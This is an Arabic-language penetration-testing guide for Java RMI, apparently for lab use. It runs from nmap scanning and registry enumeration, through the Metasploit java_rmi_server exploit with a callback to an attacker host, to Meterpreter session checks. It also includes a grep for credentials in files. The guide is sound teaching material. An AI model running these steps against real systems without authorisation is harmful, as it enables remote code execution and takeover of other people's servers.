Java RMI — من الفحص إلى ما بعد الاستغلال

1. Reconnaissance

ابدأ بتأكيد شبكتك والوصول للهدف قبل ما تدخل في فحص Java RMI.

تحديد شبكتك ومسار الهدف

Identify Local Interface KALI TERMINAL
ip a
اعرف عنوان جهازك والواجهة المستخدمة.
Review Network Route KALI TERMINAL
ip route
تأكد من الشبكة والـgateway والمسار للهدف.

اختبار الوصول

Test Target Reachability KALI TERMINAL
ping -c 4 [TARGET]
إذا ما رد الهدف، لا تعتبره Down مباشرة؛ قد يكون ICMP محجوب.
Discover Live Hosts KALI TERMINAL
nmap -sn [SUBNET]
استخدمه لاكتشاف الأجهزة الحية داخل Lab مصرح.
Java RMI غالبًا يظهر داخل بيئات Java داخلية. إذا شفت أكثر من جهاز Java على نفس الشبكة، سجّل كل IP وخله ضمن مسار الفحص.

2. Port Scanning

البورت الشائع للـRMI Registry هو 1099/TCP، لكن ممكن يتغير لذلك لا تعتمد على 1099 فقط.

فحص البورت الافتراضي

Detect Java RMI Service KALI TERMINAL
nmap -Pn -p1099 -sV [TARGET]
ابدأ بتحديد هل الخدمة مفتوحة وما إذا تعرف Nmap عليها كـJava RMI.
GENERAL REFERENCE — النجاح = Nmap يعرّف Java RMI أو يؤكد أن البورت يتحدث الخدمة المتوقعة.
Fingerprint Java RMI Service KALI TERMINAL
nmap -Pn -p1099 -sC -sV [TARGET]
يجمع version detection مع السكربتات الافتراضية.

الفحص الشامل عند عدم ظهور الخدمة

Find Non-Standard RMI Port KALI TERMINAL
nmap -Pn -p- --min-rate 1000 [TARGET]
مهم لأن RMI قد يكون على بورت غير 1099. داخل Lab فقط وراقب تأثير السرعة.
Confirm Discovered RMI Port KALI TERMINAL
nmap -Pn -p[PORT] -sV -sC [TARGET]
أعد الفحص على البورت المكتشف فعليًا.

تأكيد الاتصال يدويًا

Confirm TCP Connectivity KALI TERMINAL
nc -nv [TARGET] [PORT]
يفيد فقط لتأكيد أن TCP يقبل الاتصال؛ RMI بروتوكول ثنائي لذلك لا تتوقع banner نصي واضح.
لا تستنتج أن الخدمة ليست RMI فقط لأن Netcat ما أعطاك banner. اعتمد على Nmap/NSE وأدوات RMI المتخصصة.

3. Enumeration

الهدف هنا معرفة محتويات الـRegistry، أسماء الـremote objects، endpoints، وأي codebase أو إعدادات تكشف مسار استغلال.

Nmap NSE — Dump Registry

Enumerate RMI Registry KALI TERMINAL
nmap -Pn -p[PORT] --script rmi-dumpregistry [TARGET]
يعرض الـRMI Registry bindings والتفاصيل التي يستطيع Nmap استخراجها.
GENERAL REFERENCE — النجاح = ظهور Registry bindings/remote objects التي يكشفها الـRegistry.
Enumerate Registry with Version Detection KALI TERMINAL
nmap -Pn -p[PORT] --script rmi-dumpregistry -sV [TARGET]
أعده مع version detection حتى تجمع أكبر قدر ممكن من السياق.

فحص Classloader exposure

Check RMI Classloader Exposure KALI TERMINAL
nmap -Pn -p[PORT] --script rmi-vuln-classloader [TARGET]
يفحص إعدادات RMI class loading الخطرة المعروفة.
GENERAL REFERENCE — اعتبر المسار مهمًا فقط إذا الفحص نفسه يبين exposure مناسبًا؛ لا تفترض القابلية للاستغلال من البورت وحده.
لو ظهر Remote Object باسم غريب أو hostname/port إضافي داخل الـRegistry، دوّنه. RMI قد يحيلك إلى endpoint آخر غير بورت الـRegistry نفسه.

Remote Method Guesser (RMG)

Enumerate RMI with RMG KALI TERMINAL
java -jar rmg.jar enum [TARGET] [PORT]
إذا كانت أداة RMG موجودة عندك، استخدم enum لاستخراج معلومات الـRegistry والـobjects.
GENERAL REFERENCE — النجاح = ظهور Registry objects أو معلومات خدمة قابلة للاستخدام في القرار التالي.
Scan RMI Service with RMG KALI TERMINAL
java -jar rmg.jar scan [TARGET] [PORT]
يفيد في فحص الخدمة بشكل أوسع حسب إصدار RMG المتوفر عندك.
مهم: خيارات RMG تختلف قليلًا بين الإصدارات. استخدم java -jar rmg.jar --help لو احتجت تطابق الصياغة مع نسختك.

Metasploit — البحث عن Modules مناسبة

Search RMI Modules MSFCONSOLE
search rmi
اعرض Modules المتوفرة عندك بدل الاعتماد على أسماء محفوظة فقط.
Search RMI Exploit Modules MSFCONSOLE
search type:exploit rmi
فلتر النتائج إلى exploit modules.
Review Java RMI Server Module MSFCONSOLE
info exploit/multi/misc/java_rmi_server
راجع الشروط والخيارات قبل أي تشغيل.
مجرد وجود Java RMI لا يعني أنه قابل للاستغلال. لازم تربط نتيجة الـEnumeration بالإعداد أو الإصدار المناسب قبل تشغيل exploit.

4. Credential Testing

RMI Registry نفسه عادةً ما يستخدم نموذج username/password تقليدي مثل SSH أو FTP. لذلك لا تسوي brute-force وهمي؛ اختبر credentials فقط إذا التطبيق البعيد كشف Authentication فعلي.

تحديد هل يوجد Authentication على مستوى التطبيق

Review Registry Bindings for Authentication KALI TERMINAL
java -jar rmg.jar enum [TARGET] [PORT]
ابحث عن remote methods أو interfaces تشير إلى login/authenticate/session.
Search RMI Scanner / Login Modules MSFCONSOLE
search rmi
راجع هل توجد scanner/login modules مناسبة فعلًا لبيئتك وإصدارك.
Review RMI Module Requirements MSFCONSOLE
info [RMI_MODULE]
لا تستخدم أي login scanner إلا بعد ما تتأكد أن الـmodule يتوافق مع نوع الخدمة الموجود عندك.

Credential reuse عند وجود حسابات موثقة

Review Lab Files for Reusable Credentials KALI TERMINAL
grep -iE 'user|pass|login|credential' [FILE]
لو عندك output أو config من نفس الـLab، ابحث عن credentials لإعادة الاستخدام بدل brute-force عشوائي.
في RMI، Enumeration + misconfiguration غالبًا أهم بكثير من password spraying. لا تستخدم Hydra على 1099 بشكل عشوائي لأن RMI ليس خدمة login نصية قياسية.
إذا كان الـRemote Object يطبق login خاص بالتطبيق، اختبر فقط credentials المصرح بها داخل الـLab وبحسب نفس protocol/method المكتشف.

5. Exploitation

الاستغلال في RMI يعتمد على misconfiguration أو class loading / deserialization behavior. تأكد من الإصدار والإعداد قبل أي exploit.

مسار 1 — التحقق من Insecure Class Loading

Recheck RMI Classloader Exposure KALI TERMINAL
nmap -Pn -p[PORT] --script rmi-vuln-classloader [TARGET]
استخدم نتيجة هذا الفحص لتقرر هل مسار classloader يستحق المتابعة.
تأكد من الإصدار والنتيجة قبل أي exploit. بعض محاولات RMI قد تسبب تعليق JVM أو crash للخدمة.

مسار 2 — Metasploit Java RMI Server

Select Java RMI Server Module MSFCONSOLE
use exploit/multi/misc/java_rmi_server
استخدمه فقط إذا Enumeration والـmodule info يطابقان الهدف.
Review Module Options MSFCONSOLE
show options
راجع RHOSTS/RPORT وأي SRVHOST/LHOST أو خيارات إضافية مطلوبة.
Set Target Host MSFCONSOLE
set RHOSTS [TARGET]
حدد الهدف داخل الـLab.
Set Target Port MSFCONSOLE
set RPORT [PORT]
استخدم البورت الفعلي المكتشف وليس 1099 إذا كانت الخدمة منقولة.
Set Callback Host MSFCONSOLE
set LHOST [ATTACKER_IP]
استخدم عنوانك الذي يستطيع الهدف الوصول له.
Run Version-Specific Check MSFCONSOLE
check
إذا كان الـmodule يدعم check، استخدمه قبل run.
GENERAL REFERENCE — إذا كان الـmodule يدعم check، فالنتيجة تساعد في تحديد ما إذا كانت شروط الـmodule تبدو متوافقة مع الهدف قبل التشغيل؛ نجاح check لا يعني نجاح exploitation ولا يعني فتح Session.
Execute Matched RMI Path MSFCONSOLE
run
شغّل فقط بعد التأكد من الشروط والخيارات.
GENERAL REFERENCE — النجاح = Session/command execution فقط إذا ظهر ذلك فعليًا؛ اكتمال الـmodule وحده ليس إثباتًا.
إذا فشل exploit رغم أن Registry مفتوح، ارجع لمرحلة Enumeration: قد يكون الـRegistry متاح لكن الـremote object غير قابل للاستغلال، أو الـendpoint الحقيقي على بورت آخر.

مسار 3 — مراجعة RMG قبل أي هجوم متقدم

Review RMG Attack Options KALI TERMINAL
java -jar rmg.jar --help
راجع أوامر attack المتاحة في إصدارك بدل نسخ syntax من إصدار مختلف.
لو اكتشفت gadget/deserialization path محدد، اربطه بالإصدار والـremote method الفعلي. لا تستخدم payload عشوائي بدون دليل من الـEnumeration.

6. Post-Exploitation

بعد نجاح الاستغلال، المطلوب هنا تأكيد الوصول بسرعة وتوثيق السياق بدون تكرار دليل Post-Exploitation العام.

تأكيد الجلسة

Verify Meterpreter User METERPRETER
getuid
أكد المستخدم الذي تعمل به الجلسة.
Identify Remote System METERPRETER
sysinfo
حدد نظام التشغيل والمعمارية والمضيف.
Check Session Process METERPRETER
getpid
اعرف PID الحالي للجلسة.
بعد التأكيد، انتقل لملف Post-Exploitation العام عندك بدل تكرار enumeration النظام كامل هنا.

لو حصلت على Shell مباشر بدل Meterpreter

Immediate User Verification VICTIM SHELL
whoami
تأكيد الهوية بسرعة.
Immediate Host Verification VICTIM SHELL
hostname
تأكيد أنك على الجهاز المقصود.
Verify Linux Identity VICTIM SHELL
id
على Linux يوضح UID/GID والمجموعات.
لا تنفذ تغييرات دائمة أو حذف logs أو تعطيل خدمات. داخل Lab اكتفِ بما يلزم لإثبات الوصول ثم وثق النتيجة.
